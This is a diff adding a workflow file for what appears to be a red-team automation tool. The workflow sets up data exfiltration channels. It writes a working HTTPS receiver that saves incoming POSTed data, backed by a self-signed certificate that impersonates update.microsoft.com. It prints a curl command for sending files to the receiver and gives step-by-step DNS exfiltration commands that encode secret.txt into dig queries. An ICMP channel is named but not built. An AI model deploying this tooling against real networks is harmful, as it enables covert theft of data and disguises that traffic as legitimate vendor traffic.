@@ -1,0 +1,115 @@
+# yaml-language-server: $schema=~/.ofx/workflow_schema.json
+name: exfil-channels
+description: |
+  Set up multiple data exfiltration channels — configures DNS, HTTP,
+  and ICMP exfil servers for testing data exfiltration paths during
+  red team engagements.
+tags: [setup, exfil, opsec, c2]
+
+dispatch:
+  inputs:
+    listen_ip:
+      type: string
+      default: "0.0.0.0"
+      description: IP to bind exfil listeners on
+    dns_domain:
+      type: string
+      default: ""
+      description: Domain for DNS exfil (empty to skip DNS channel)
+    http_port:
+      type: number
+      default: 8443
+      description: Port for HTTPS exfil receiver
+    output_dir:
+      type: string
+      default: "/tmp/exfil-data"
+      description: Directory to store received exfil data
+
+jobs:
+  prepare:
+    name: Prepare Directories
+    outputs:
+      output_dir: "{{ inputs.output_dir }}"
+    steps:
+      - name: Create output dirs
+        run: |
+          mkdir -p {{ inputs.output_dir }}/{dns,http,icmp}
+          echo "Exfil output: {{ inputs.output_dir }}"
+
+  http-channel:
+    name: HTTP Exfil Server
+    needs: [prepare]
+    steps:
+      - name: Create HTTPS receiver
+        script: |
+          import ssl
+          import os
+          from pathlib import Path
+
+          port = {{ inputs.http_port }}
+          output_dir = "{{ inputs.output_dir }}/http"
+
+          # Generate self-signed cert
+          cert_path = "/tmp/exfil-cert.pem"
+          key_path = "/tmp/exfil-key.pem"
+          if not Path(cert_path).exists():
+              os.system(
+                  f"openssl req -x509 -nodes -days 30 -newkey rsa:2048 "
+                  f"-keyout {key_path} -out {cert_path} "
+                  f'-subj "/CN=update.microsoft.com"'
+              )
+
+          # Write receiver script
+          receiver = f'''#!/usr/bin/env python3
+          import http.server, ssl, os, base64, json
+          from datetime import datetime
+
+          class ExfilHandler(http.server.BaseHTTPRequestHandler):
+              def do_POST(self):
+                  length = int(self.headers.get("Content-Length", 0))
+                  data = self.rfile.read(length)
+                  ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+                  outfile = f"{output_dir}/{{ts}}_exfil.bin"
+                  with open(outfile, "wb") as f:
+                      f.write(data)
+                  self.send_response(200)
+                  self.end_headers()
+                  self.wfile.write(b"OK")
+                  self.log_message("Received %d bytes -> %s", length, outfile)
+
+              def log_message(self, fmt, *args):
+                  print(f"[HTTP-EXFIL] {{fmt % args}}")
+
+          ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+          ctx.load_cert_chain("{cert_path}", "{key_path}")
+          srv = http.server.HTTPServer(("{{ inputs.listen_ip }}", {port}), ExfilHandler)
+          srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
+          print(f"HTTPS exfil receiver on :{port}")
+          srv.serve_forever()
+          '''
+
+          script_path = "/tmp/exfil_http_receiver.py"
+          with open(script_path, "w") as f:
+              f.write(receiver)
+          print(f"HTTP receiver script: {script_path}")
+          print(f"Start with: python3 {script_path}")
+          print(f"Send data:  curl -k -X POST https://HOST:{port}/ -d @file")
+
+  dns-channel:
+    name: DNS Exfil Notes
+    needs: [prepare]
+    run_if: "{{ inputs.dns_domain }}"
+    steps:
+      - name: DNS exfil instructions
+        run: |
+          echo "=== DNS Exfiltration Channel ==="
+          echo "Domain: {{ inputs.dns_domain }}"
+          echo ""
+          echo "Encode and send data via DNS queries:"
+          echo "  data=\$(cat secret.txt | base64 | tr '+/' '-_' | fold -w 60)"
+          echo "  for chunk in \$data; do"
+          echo "    dig \$chunk.{{ inputs.dns_domain }} @{{ inputs.listen_ip }}"
+          echo "  done"
+          echo ""
+          echo "Receive with: sudo tcpdump -i any -n 'port 53' -l | grep {{ inputs.dns_domain }}"
+        log-stdout: true
